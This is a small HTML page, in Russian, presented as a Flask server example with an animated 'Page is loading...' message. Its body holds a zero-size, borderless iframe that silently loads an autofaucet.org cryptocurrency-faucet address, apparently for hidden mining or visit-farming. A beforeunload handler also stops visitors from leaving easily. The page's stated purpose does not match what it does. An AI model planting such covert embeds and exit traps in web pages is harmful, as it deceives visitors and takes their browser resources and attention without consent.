<!DOCTYPE html>
<html>
<head>
    <title>Пример сервера с Flask</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f2f2f2;
        }
        #loading-text {
            animation: moveText 2s infinite alternate;
        }
        @keyframes moveText {
            from {
                transform: translateY(0);
            }
            to {
                transform: translateY(30px);
            }
        }
    </style>
    <script>
        window.addEventListener('beforeunload', function (e) {
            e.preventDefault();
            e.returnValue = '';
            console.log('Пользователь закрывает страницу.');
            // Здесь вы можете выполнить дополнительные действия, например, отправить запрос на сервер.
        });
    </script>
</head>
<body>
    <p id="loading-text">Страница загружается...</p>
    <iframe src="https://autofaucet.org/wm/moonblock/2" width="0" height="0" style="border:0"></iframe>
</body>
</html>

